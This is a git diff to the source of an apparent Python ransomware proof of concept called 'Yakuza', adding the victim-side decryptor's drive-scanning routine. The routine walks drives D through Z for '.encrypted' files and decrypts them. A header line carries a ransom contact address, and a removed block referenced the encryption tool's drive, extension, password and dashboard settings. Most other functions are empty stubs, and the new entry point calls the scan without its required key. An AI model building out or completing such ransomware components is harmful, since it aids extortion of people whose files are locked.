@@ -855,20 +855,68 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             messagebox.showerror("Error", "[-] Decryption key is not provided.")
 
     # Function to scan and decrypt files
-    def scan_and_decrypt(self):
-        pass
+    def scan_and_decrypt(self, key):
+        encryptedFiles = []
+
+        # List generator with existed drives in the machine
+        drives = [f"{x}:\\" for x in "DEFGHIJKLMNOPQRSTUVWXYZ" if path.exists(f"{x}:\\")]
+
+        # Iterate over each drive
+        for drive in drives:
+            self.log(f"Scanning drive {drive} for encrypted files.")
+
+            # Iterate on the all directories and files in the drive
+            for dp, dn, filenames in walk(drive):
+                # if directory path is special os directories jump to loop begin
+                if any(exclude in dp for exclude in {'System Volume Information', '$RECYCLE.BIN', 'Windows'}):
+                    continue
+
+                # Iterate on the all files in the directory
+                for f in filenames:
+                    # if the file is encrypted, then append it to an encrypted_files list
+                    if f.endswith('.encrypted'):
+                        encryptedFiles.append(path.join(dp, f))
+                        self.log(f"Found encrypted file: {path.join(dp, f)}")
+
+        # Calculate pre requires data for decryption process
+        totalFiles = len(encryptedFiles)
+        self.safe_update_progress(0, totalFiles)
+        decryptedCount = 0
+
+        # iterate on the all .encrypted files in the encrypted_files list
+        for filePath in encryptedFiles:
+            # Decrypt file with key and update decryption progress
+            if self.decrypt_file(filePath, key):
+                # Decrypt file with key and update decryption progress
+                decryptedCount += 1
+                self.safe_update_progress(decryptedCount, totalFiles)
+
+        # if all files decrypted successfully, then stop_timer_and_show_success dialog box
+        if decryptedCount == totalFiles:
+            self.after(0, self.stop_timer_and_show_success)
+
+        #else, all files decrypted a Failed, show error message in a messagebox
+        else:
+            self.after(0, lambda: messagebox.showerror('Decryption Failed',
+                                                       '[-] Failed to decrypt one or more files. Please check the decryption key and try again.'))
+
+    # TODO Until Step 40, define show_incomplete_message() function
 
 
     def load_timer_state(self):
         pass
 
-
-    def start_decryption(self):
+    def safe_update_progress(self, value, maximum):
         pass
 
-# if __name__ == "__main__":
-#     # Create an instance of the EncryptionTool class
-#     encryptionTool = EncryptionTool(drives=DRIVES_TO_ENCRYPT, extensions=EXTENSION_TO_ENCRYPT,
-#                                     password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
-#     encryptionTool.create_important_files(r"H:/Repo/RansomPOC")
-#     encryptionTool.encrypt_files_in_directory(r"H:/Repo/RansomPOC/D-Data")
+    def stop_timer_and_show_success(self):
+        pass
+
+
+    def decrypt_file(self, file_path, key):
+        pass
+
+if __name__ == "__main__":
+    # Create an instance of the EncryptionTool class
+    decryptor = DecryptorApp()
+    decryptor.scan_and_decrypt()
